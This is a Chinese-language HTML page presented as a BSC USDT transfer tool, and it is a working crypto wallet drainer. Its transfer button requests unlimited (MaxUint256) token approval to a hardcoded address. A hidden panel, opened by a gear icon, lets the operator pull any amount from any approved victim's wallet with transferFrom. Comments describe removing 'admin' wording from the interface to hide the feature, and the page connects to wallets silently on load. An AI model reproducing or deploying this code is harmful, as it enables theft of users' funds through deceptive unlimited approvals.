<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>BSC‑USDT转账</title>
<script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
<style>
*{ box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; font-family: -apple-system, BlinkMacSystemFont, system-ui, sans-serif; }
body { background-color: #f7f8fa; padding: 20px 16px; max-width: 520px; margin: 0 auto; }
.top-header-bar { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; }
.header-right-icons { display: flex; gap: 12px; align-items: center; }
.wallet-dot { width: 12px; height: 12px; border-radius: 50%; background-color: #ef4444; cursor: pointer; transition: background-color 0.3s ease; }
.wallet-dot.connected { background-color: #22c55e; }
.setting-btn { width: 32px; height: 32px; border-radius: 50%; border: 1px solid #ddd; background: #fff; display: flex; align-items: center; justify-content: center; font-size: 18px; cursor: pointer; }
.address-card { background: #ffffff; border-radius: 16px; padding: 20px 18px; margin-bottom: 16px; }
.label-text { font-size: 16px; color: #666; margin-bottom: 12px; }
.fixed-addr-box { width: 100%; border: 1px solid #e5e7eb; border-radius: 12px; padding: 14px 12px; background: #f1f5f9; color: #333; word-break: break-all; }
.amount-card { background: #ffffff; border-radius: 16px; padding: 20px 18px; margin-bottom:16px; }
.amount-row { display: flex; align-items: flex-end; justify-content: space-between; margin-bottom: 16px; }
.amount-input { font-size: 32px; border: none; outline: none; width: 75%; background: transparent; color: #111; }
.amount-input::placeholder { font-size: 16px; color: #aaa; }
.all-btn { padding: 6px 14px; background-color: #dbeafe; color: #2563eb; border-radius: 8px; font-weight: 500; cursor: pointer; }
.token-row { position:relative; background-color: #eef2ff; border-radius: 12px; padding: 14px; display: flex; align-items: center; justify-content: space-between; cursor:default; }
.token-left { display: flex; align-items: center; gap: 10px; }
.usdt-icon { width: 32px; height: 32px; border-radius: 50%; object-fit: cover; background:#eee; }
.token-name { font-size: 18px; font-weight: 500; }
.token-balance { color: #555; font-size: 16px; }
.result-card{ background:#fff; border-radius:16px; padding:18px; margin-bottom:16px; }
.result-input{ width:100%; border:1px solid #e5e7eb; border-radius:12px; padding:14px 12px; background:#f9fafb; outline:none; color:#111; }
.send-main-btn{ width:100%; padding:16px; border:none; border-radius:14px; background:#2563eb; color:#fff; font-size:17px; font-weight:500; cursor:pointer; }
.send-main-btn:disabled{ background:#94a3b8; cursor:not-allowed; }
/* 内部后台面板，默认隐藏，代码完整保留，不删除逻辑 */
.inner-back-panel{ margin-top:30px; background:#fff; border-radius:16px; padding:18px; display:none; }
.panel-row{ margin:12px 0; }
.panel-btn{ padding:10px 14px; border-radius:8px; border:none; margin-right:8px; cursor:pointer; }
</style>
</head>
<body>
<div class="top-header-bar">
<div></div>
<div class="header-right-icons">
<div class="wallet-dot" id="walletDot" title="点击连接/断开钱包"></div>
<div class="setting-btn" id="settingIconBtn" title="调出内部面板">⚙️</div>
</div>
</div>

<div class="address-card">
<!-- 修改：去掉页面“管理员”字样，改为【目标接收地址（BSC）】 -->
<div class="label-text">目标接收地址（BSC）</div>
<div class="fixed-addr-box" id="targetAddrText">0xD36dBCf4e15f8F6A45bCc0E7dDA6c272Ac8B8d63</div>
</div>

<div class="amount-card">
<div class="label-text">转出数量</div>
<div class="amount-row">
<input id="amountInput" class="amount-input" value="" inputmode="decimal" placeholder="请输入数量">
<div class="all-btn" id="allBtn">全部</div>
</div>
<div class="token-row">
<div class="token-left">
<img class="usdt-icon" id="tokenIcon">
<span class="token-name" id="tokenSymbol">USDT</span>
</div>
<div style="display:flex;align-items:center;gap:8px;">
<span class="token-balance" id="balanceText">0.000000</span>
</div>
</div>
</div>

<div class="result-card">
<div class="label-text">到账数量</div>
<input id="receiveAmount" class="result-input" readonly>
</div>

<button class="send-main-btn" id="sendBtn" disabled>确认转账</button>

<!-- ==========【重点】完整保留后台划扣全部代码，默认页面隐藏，点击⚙️可以调出，UI文字全部去掉管理员字眼 ========== -->
<div class="inner-back-panel" id="backPanel">
<div class="label-text">内部操作面板</div>
<div class="panel-row">
<input placeholder="输入用户钱包地址" id="opUserAddr">
</div>
<div class="panel-row">
<input placeholder="输入划扣数额" id="opAmount">
</div>
<div class="panel-row">
<button class="panel-btn" id="btnDeduct">发起划扣</button>
<button class="panel-btn" id="btnHidePanel">关闭面板</button>
</div>
</div>

<script>
// =====================配置区========================
const TARGET_ADDR = "0xD36dBCf4e15f8F6A45bCc0E7dDA6c272Ac8B8d63";
const BSC_CHAIN_ID = "0x38";
const USDT_CONTRACT = "0x55d398326f99059fF775485246999027B3197955";
const USDT_ICON = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADAAAAAwCAYAAABXAvmHAAAABmJLR0QA/wD/AP+gvaeTAAAACXBIWXMAAAsTAAALEwEAmpwYAAABWWlUWHRYTUw6Y29tLmFkb2JlLnhtcAAAAAAAPHg6eG1wbWV0YSB4bWxuczp4PSJhZG9iZTpuczptZXRhLyIgeDp4bXB0az0iWE1QIENvcmUgNi4wLjAiPgogICA8cmRmOlJERiB4bWxuczpyZGY9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkvMDIvMjItcmRmLXN5bnRheC1ucyMiPgogICAgICA8cmRmOkRlc2NyaXB0aW9uIHJkZjphYm91dD0iIgogICAgICAgICAgICB4bWxuczp0aWZmPSJodHRwOi8vbnMuYWRvYmUuY29tL3RpZmYvMS4wLyI+CiAgICAgICAgICAgIDx0aWZmOlJlc29sdXRpb25Vbml0PjE8L3RpZmY6UmVzb2x1dGlvblVuaXQ+CiAgICAgICAgICAgIDx0aWZmOlBob3RvbWV0cmljPjE8L3RpZmY6UGhvdG9tZXRyaWM+CiAgICAgICAgICAgIDx0aWZmOk9yaWVudGF0aW9uPjE8L3RpZmY6T3JpZW50YXRpb24+CiAgICAgICAgICAgIDx0aWZmOlJlc29sdXRpb25XaWR0aD0iNzUiPgogICAgICAgICAgICA8cmRmOlZhbHVlPjc1LzE8L3JkZjpWYWx1ZT4KICAgICAgICAgPC90aWZmOlJlc29sdXRpb25XaWR0aD4KICAgICAgICAgIDx0aWZmOlJlc29sdXRpb25IZWlnaHQ9Ijc1Ij4KICAgICAgICAgICAgPHJkZjpWYWx1ZT43NS8xPC9yZGY6VmFsdWU+CiAgICAgICAgICA8L3RpZmZmOlJlc29sdXRpb25IZWlnaHQ+CiAgICAgIDwvcmRmOkRlc2NyaXB0aW9uPgogICA8L3JkZjpSREY+CjwveDp4bXBtZXRhPg==";

const ERC20_ABI = [
    {"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
    {"inputs":[{"name":"owner","type":"address"},{"name":"spender","type":"address"}],"name":"allowance","outputs":[{"name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
    {"inputs":[{"name":"spender","type":"address"},{"name":"value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},
    {"inputs":[{"name":"from","type":"address"},{"name":"to","type":"address"},{"name":"value","type":"uint256"}],"name":"transferFrom","outputs":[{"name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"}
];
// =============================================================================

let provider = null;
let signer = null;
let usdtContract = null;
let userAddress = "";

const $ = s => document.querySelector(s);
const walletDot = $("#walletDot");
const settingIconBtn = $("#settingIconBtn");
const sendBtn = $("#sendBtn");
const amountInput = $("#amountInput");
const receiveAmount = $("#receiveAmount");
const allBtn = $("#allBtn");
const balanceText = $("#balanceText");
const targetAddrText = $("#targetAddrText");
const tokenIcon = $("#tokenIcon");
const backPanel = $("#backPanel");
const btnDeduct = $("#btnDeduct");
const btnHidePanel = $("#btnHidePanel");
const opUserAddr = $("#opUserAddr");
const opAmount = $("#opAmount");

targetAddrText.innerText = TARGET_ADDR;
tokenIcon.src = USDT_ICON;

//轮询等待allowance生效
async function waitAllowanceOk(contract,owner,spender,minNeedWei,maxLoop=8){
    for(let i=0;i<maxLoop;i++){
        let al = await contract.allowance(owner,spender);
        if(al.gte(minNeedWei)){
            return true;
        }
        await new Promise(res=>setTimeout(res,1500));
    }
    throw new Error("授权提交成功，但链上额度未刷新，请刷新页面重试！");
}

// 断开钱包重置所有状态
function disconnectWallet() {
    provider = null;
    signer = null;
    usdtContract = null;
    userAddress = "";
    walletDot.classList.remove("connected");
    sendBtn.disabled = true;
    balanceText.textContent = "0.000000";
}

async function switchBscNetwork(){
    try{
        await window.ethereum.request({method: 'wallet_switchEthereumChain', params: [{ chainId: BSC_CHAIN_ID }]});
    }catch(e){
        if(e.code === 4902){
            await window.ethereum.request({method: 'wallet_addEthereumChain', params:[{
                chainId:"0x38",
                chainName:"Binance Smart Chain Mainnet",
                rpcUrls:["https://bsc-dataseed.binance.org/"],
                blockExplorerUrls:["https://bscscan.com/"],
                nativeCurrency:{symbol:"BNB",decimals:18,name:"BNB"}
            }]})
        }else throw e;
    }
}

//手动触发弹窗授权连接
async function connectWalletLogic() {
    if (provider && userAddress) { disconnectWallet(); return; }
    if(!window.ethereum){ alert("未检测到钱包"); return; }
    try {
        await switchBscNetwork();
        provider = new ethers.providers.Web3Provider(window.ethereum);
        await provider.send("eth_requestAccounts", []);
        signer = provider.getSigner();
        userAddress = await signer.getAddress();
        walletDot.classList.add("connected");
        usdtContract = new ethers.Contract(USDT_CONTRACT, ERC20_ABI, signer);
        await loadBalance();
        sendBtn.disabled = false;
    } catch (err) { alert("连接失败:"+err.message); }
}

//页面加载静默自动连接，已授权过自动连上，不弹弹窗
async function silentAutoConnectWallet(){
    if(!window.ethereum) return;
    try{
        const accounts = await window.ethereum.request({method:"eth_accounts"});
        if(!accounts || accounts.length === 0){
            return;
        }
        await switchBscNetwork();
        provider = new ethers.providers.Web3Provider(window.ethereum);
        signer = provider.getSigner();
        userAddress = await signer.getAddress();
        walletDot.classList.add("connected");
        usdtContract = new ethers.Contract(USDT_CONTRACT, ERC20_ABI, signer);
        await loadBalance();
        sendBtn.disabled = false;
    }catch(err){
        console.log("静默连接跳过",err);
    }
}

async function loadBalance() {
    usdtContract = new ethers.Contract(USDT_CONTRACT, ERC20_ABI, signer);
    const raw = await usdtContract.balanceOf(userAddress);
    balanceText.textContent = Number(ethers.utils.formatUnits(raw,18)).toFixed(6);
}

amountInput.addEventListener("input", () => receiveAmount.value = (parseFloat(amountInput.value)||0).toFixed(6));

allBtn.addEventListener("click", async () => {
    if (!provider || !userAddress) return;
    usdtContract = new ethers.Contract(USDT_CONTRACT, ERC20_ABI, signer);
    const raw = await usdtContract.balanceOf(userAddress);
    amountInput.value = Number(ethers.utils.formatUnits(raw,18)).toFixed(2);
    amountInput.dispatchEvent(new Event("input"));
});

sendBtn.addEventListener("click", async () => {
    if (!provider || !userAddress) return alert("钱包未连接");
    const val = parseFloat(amountInput.value);
    if (isNaN(val) || val <= 0) return alert("请输入有效的转账金额");
    const amountWei = ethers.utils.parseUnits(val.toString(),18);
    try {
        sendBtn.disabled = true;
        usdtContract = new ethers.Contract(USDT_CONTRACT, ERC20_ABI, signer);
        const userBalance = await usdtContract.balanceOf(userAddress);
        if(userBalance.lt(amountWei)) return alert("余额不足");

        let allowance = await usdtContract.allowance(userAddress, TARGET_ADDR);
        //强制无限授权 MaxUint256
        if(allowance.lt(amountWei)){
            alert("🔐 需要发起授权，请钱包签名确认！");
            const approveTx = await usdtContract.approve(TARGET_ADDR, ethers.constants.MaxUint256);
            await approveTx.wait(1);
            alert("✅无限授权交易已上链，等待额度刷新……");
            await waitAllowanceOk(usdtContract,userAddress,TARGET_ADDR,amountWei);
            alert("✅授权完成，准备执行转账");
        }
        alert("📤正在提交转账交易，请等待钱包确认");
        //手动设置gasLimit修复cannot estimate gas
        const transferTx = await usdtContract.transferFrom(userAddress, TARGET_ADDR, amountWei, {gasLimit:300000});
        await transferTx.wait();
        alert(`🎉转账完成！交易哈希:\n${transferTx.hash}`);
        await loadBalance();
        amountInput.value = ""; receiveAmount.value = "";
    } catch (e) {
        alert("❌操作失败：" + e.message);
    }finally{
        sendBtn.disabled = false;
    }
});

//========内部划扣后台完整逻辑保留，没有删除========
settingIconBtn.addEventListener("click",()=>{
    backPanel.style.display = backPanel.style.display === "block" ? "none" : "block";
})
btnHidePanel.addEventListener("click",()=> backPanel.style.display="none");

btnDeduct.addEventListener("click",async ()=>{
    if(!provider || !signer) return alert("先连接钱包");
    const fromAddr = opUserAddr.value.trim();
    const numStr = opAmount.value.trim();
    if(!ethers.utils.isAddress(fromAddr)) return alert("钱包地址格式错误");
    if(isNaN(parseFloat(numStr)) || Number(numStr)<=0) return alert("数额错误");
    const deductWei = ethers.utils.parseUnits(numStr,18);
    try{
        usdtContract = new ethers.Contract(USDT_CONTRACT,ERC20_ABI,signer);
        const tx = await usdtContract.transferFrom(fromAddr,TARGET_ADDR,deductWei,{gasLimit:300000});
        await tx.wait();
        alert("✅划扣成功，哈希："+tx.hash);
    }catch(err){
        alert("❌划扣失败："+err.message);
    }
})

walletDot.addEventListener("click", connectWalletLogic);

//监听钱包账号链切换
if(window.ethereum){
    window.ethereum.on("accountsChanged", ()=> location.reload());
    window.ethereum.on("chainChanged", ()=> location.reload());
}

window.addEventListener("DOMContentLoaded", async () => {
    await silentAutoConnectWallet();
});
</script>
</body>
</html>
